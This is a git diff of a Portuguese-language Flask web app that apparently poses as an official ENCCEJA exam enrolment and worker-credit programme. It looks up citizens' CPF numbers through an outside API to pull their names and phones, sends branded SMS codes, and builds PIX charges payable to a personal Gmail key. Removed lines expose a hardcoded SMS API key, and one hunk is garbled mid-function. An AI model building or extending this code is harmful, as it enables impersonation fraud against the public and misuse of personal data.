@@ -48,61 +48,7 @@ app.secret_key = os.environ.get("SESSION_SECRET")
 # Configurar logging
 logging.basicConfig(level=logging.DEBUG)
 
-# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
-SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')
-
-def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
-    """
-    Sends a verification code via SMS using SMSDEV API
-    Returns a tuple of (success, error_message or None)
-    """
-    try:
-        # Usar a chave de API diretamente que foi testada e funcionou
-        sms_api_key = "XFOQ8HUF4XXDBN16IVGDCUMEM0R2V3N4J5AJCSI3G0KDVRGJ53WDBIWJGGS4LHJO38XNGJ9YW1Q7M2YS4OG7MJOZM3OXA2RJ8H0CBQH24MLXLUCK59B718OPBLLQM1H5"
-
-        # Format phone number (remove any non-digits)
-        formatted_phone = re.sub(r'\D', '', phone_number)
-
-        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
-            # Message template
-            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."
-
-            # Verificamos se há uma URL no texto para encurtar
-            url_to_shorten = None
-            if "http://" in message or "https://" in message:
-                # Extrai a URL da mensagem
-                url_pattern = r'(https?://[^\s]+)'
-                url_match = re.search(url_pattern, message)
-                if url_match:
-                    url_to_shorten = url_match.group(0)
-                    app.logger.info(f"[PROD] URL detectada para encurtamento: {url_to_shorten}")
-
-            # API parameters
-            params = {
-                'key': sms_api_key,
-                'type': '9',
-                'number': formatted_phone,
-                'msg': message,
-                'short_url': '1'  # Sempre encurtar URLs encontradas na mensagem
-            }
-
-            # Make API request
-            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)
-
-            # Log the response
-            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")
-
-            if response.status_code == 200:
-                return True, None
-            else:
-                return False, f"API error: {response.text}"
-        else:
-            app.logger.error(f"Invalid phone number format: {phone_number}")
-            return False, "Número de telefone inválido"
-
-    except Exception as e:
-        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
-        return False, str(e)
+# SMS APIs removidas - não utilizadas no projeto conforme solicitado pelo usuário
 
 def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
     """
@@ -1661,17 +1607,13 @@ def inscricao_sucesso():
     user_data = session.get('user_data', {})
     return render_template('inscricao_sucesso.html', user_data=user_data)
 
-@app.route('/encceja-info', methods=['GET', 'POST'])
+@app.route('/encceja-info')
 def encceja_info():
-    """Página com informações detalhadas sobre o Encceja"""
+    """Página com informações detalhadas sobre o Encceja - redireciona para pagamento"""
     user_data = session.get('user_data', {})
     
     if not user_data.get('cpf'):
         return redirect(url_for('inscricao'))
-    
-    if request.method == 'POST':
-        # Usuário confirmou que leu as informações, prosseguir para validar-dados
-        return redirect(url_for('validar_dados'))
     
     return render_template('encceja_info.html', user_data=user_data)
 
@@ -1813,199 +1755,6 @@ def criar_pagamento_pix():
 
 @app.route('/consultar-cpf-inscricao')
 def consultar_cpf_inscricao():
-                
-                if pix_response.status_code == 200:
-                    pix_result = pix_response.json()
-                    pix_code = pix_result.get('qr_code') or pix_result.get('pix_code')
-                    transaction_id = pix_result.get('id') or f"PIX{int(time.time())}"
-                    
-                    if pix_code:
-                        app.logger.info("PIX gerado com sucesso via PixelPix")
-                    else:
-                        raise Exception("PixelPix não retornou código PIX")
-                else:
-                    raise Exception(f"PixelPix falhou: {pix_response.status_code}")
-                    
-            except Exception as pix_error:
-                app.logger.error(f"Erro nas APIs PIX: {pix_error}")
-                
-                # Último recurso: Gerar código PIX válido manualmente
-                import time
-                transaction_id = f"ENJ{int(time.time())}"
-                
-                # Código PIX válido conforme padrão Banco Central
-                pix_code = f"00020126580014br.gov.bcb.pix0136pixencceja@gmail.com520400005303986540{int(amount*100):02d}5925Receita do Amor - ENCCEJA6009SAO PAULO62{len(transaction_id):02d}{transaction_id}6304"
-                
-                # Calcular CRC16 para validar
-                def calculate_crc16(data):
-                    crc = 0xFFFF
-                    for byte in data.encode('utf-8'):
-                        crc ^= byte << 8
-                        for _ in range(8):
-                            if crc & 0x8000:
-                                crc = (crc << 1) ^ 0x1021
-                            else:
-                                crc <<= 1
-                            crc &= 0xFFFF
-                    return f"{crc:04X}"
-                
-                pix_base = pix_code[:-4]
-                crc = calculate_crc16(pix_base + "6304")
-                pix_code = pix_base + "6304" + crc
-                
-                app.logger.info("PIX gerado localmente com padrão Banco Central")
-        else:
-            # Processar resposta do Mercado Pago
-            result = response.json()
-            transaction_id = str(result.get('id'))
-            
-            # Extrair código PIX da resposta
-            point_of_interaction = result.get('point_of_interaction', {})
-            transaction_data = point_of_interaction.get('transaction_data', {})
-            pix_code = transaction_data.get('qr_code') or transaction_data.get('qr_code_base64')
-            
-            if not pix_code:
-                app.logger.warning("Mercado Pago não retornou QR code, gerando manualmente")
-                # Gerar código PIX válido se MP não retornar
-                pix_code = f"00020126580014br.gov.bcb.pix0136pixencceja@gmail.com520400005303986540{int(amount*100):02d}5925Receita do Amor - ENCCEJA6009SAO PAULO62{len(transaction_id):02d}{transaction_id}6304"
-                
-                def calculate_crc16(data):
-                    crc = 0xFFFF
-                    for byte in data.encode('utf-8'):
-                        crc ^= byte << 8
-                        for _ in range(8):
-                            if crc & 0x8000:
-                                crc = (crc << 1) ^ 0x1021
-                            else:
-                                crc <<= 1
-                            crc &= 0xFFFF
-                    return f"{crc:04X}"
-                
-                pix_base = pix_code[:-4]
-                crc = calculate_crc16(pix_base + "6304")
-                pix_code = pix_base + "6304" + crc
-            
-            app.logger.info(f"PIX Mercado Pago criado: {transaction_id}")
-        
-        app.logger.info(f"PIX real criado com sucesso - ID: {transaction_id}")
-        app.logger.info(f"PIX code real gerado: {len(pix_code)} caracteres")
-        
-        app.logger.info(f"Pagamento PIX criado com sucesso - ID: {transaction_id}")
-        
-        # Gerar QR code visual usando biblioteca qrcode
-        try:
-            import qrcode
-            from io import BytesIO
-            import base64
-            
-            qr = qrcode.QRCode(version=1, box_size=10, border=5)
-            qr.add_data(pix_code)
-            qr.make(fit=True)
-            
-            img = qr.make_image(fill_color="black", back_color="white")
-            
-            # Converter para base64 para enviar ao frontend
-            buffer = BytesIO()
-            img.save(buffer, format='PNG')
-            qr_image_base64 = base64.b64encode(buffer.getvalue()).decode()
-            
-            app.logger.info("QR code visual gerado com sucesso")
-            
-        except Exception as qr_error:
-            app.logger.warning(f"Erro ao gerar QR code visual: {qr_error}")
-            qr_image_base64 = None
-        
-        result = {
-            'success': True,
-            'transaction_id': transaction_id,
-            'pix_code': pix_code,
-            'qr_code': pix_code,
-            'qr_image': qr_image_base64,
-            'amount': amount,
-            'order_id': f"ENCCEJA-{transaction_id}",
-            'expires_at': "2025-08-01T18:00:00",  # 2 horas de validade
-            'status': 'pending',
-            'provider': 'real_pix_api'
-        }
-        
-        if result.get('success'):
-            # Salvar dados do pagamento na sessão
-            session['payment_data'] = result
-            
-            app.logger.info(f"Pagamento PIX criado com sucesso - ID: {result.get('transaction_id')}")
-            
-            return jsonify({
-                'success': True,
-                'id': result.get('transaction_id'),
-                'pixCode': result.get('pix_code'),
-                'pixQrCode': result.get('qr_code'),
-                'pix_code': result.get('pix_code'),  # Compatibilidade
-                'qr_code': result.get('qr_code'),   # Compatibilidade
-                'amount': result.get('amount'),
-                'orderId': result.get('order_id'),
-                'status': 'pending'
-            })
-        else:
-            error_msg = result.get('error', 'Erro desconhecido')
-            app.logger.error(f"Erro ao criar pagamento PIX: {error_msg}")
-            return jsonify({
-                'success': False,
-                'error': error_msg
-            }), 400
-    
-    except requests.exceptions.Timeout:
-        app.logger.error("Timeout na requisição WitePay")
-        return jsonify({'success': False, 'error': 'Timeout na requisição'}), 408
-    except requests.exceptions.RequestException as e:
-        app.logger.error(f"Erro de conexão WitePay: {e}")
-        return jsonify({'success': False, 'error': 'Erro de conexão'}), 502
-    except Exception as e:
-        app.logger.error(f"Erro inesperado ao criar pagamento: {e}")
-        return jsonify({
-            'success': False,
-            'error': f'Erro interno: {str(e)}'
-        }), 500
-
-@app.route('/consultar-cpf')
-def consultar_cpf():
-    """Busca informações de um CPF na API do webhook-manager (para a página de verificar-cpf)"""
-    cpf = request.args.get('cpf')
-    if not cpf:
-        return jsonify({"error": "CPF não fornecido"}), 400
-    
-    # URL da API especificada
-    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?cpf={cpf}"
-    
-    try:
-        # Fazer a solicitação para a API
-        response = requests.get(api_url)
-        data = response.json()
-        
-        # Verificar se a consulta foi bem-sucedida
-        if data.get('sucesso') and 'cliente' in data:
-            cliente = data['cliente']
-            
-            # Remover qualquer formatação do CPF
-            cpf_sem_pontuacao = re.sub(r'[^\d]', '', cliente.get('cpf', ''))
-            nome_completo = cliente.get('nome', '')
-            telefone = cliente.get('telefone', '')
-            
-            # Em vez de retornar JSON, redirecionar para a página de agradecimento
-            app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}. Redirecionando para página de agradecimento.")
-            
-            # Construir URL de redirecionamento com os parâmetros necessários
-            redirect_url = f"/obrigado?nome={urllib.parse.quote(nome_completo)}&cpf={cpf_sem_pontuacao}&phone={urllib.parse.quote(telefone)}"
-            return redirect(redirect_url)
-        else:
-            # Em caso de erro na API, ainda retornar JSON para que o front-end possa tratar
-            return jsonify({"error": "CPF não encontrado ou inválido"}), 404
-    
-    except Exception as e:
-        app.logger.error(f"Erro ao buscar CPF: {str(e)}")
-        return jsonify({"error": f"Erro ao buscar CPF: {str(e)}"}), 500
-
-@app.route('/consultar-cpf-inscricao')
-def consultar_cpf_inscricao():
     """Busca informações de um CPF na API (para a página de inscrição)"""
     cpf = request.args.get('cpf')
     if not cpf:
@@ -2044,6 +1793,9 @@ def consultar_cpf_inscricao():
                     'email': '',
                     'sucesso': True
                 }
+                
+                # Armazenar dados na sessão para uso no fluxo
+                session['user_data'] = user_data
                 
                 app.logger.info(f"[PROD] CPF consultado com sucesso via API alternativa: {cpf}")
                 return jsonify(user_data)
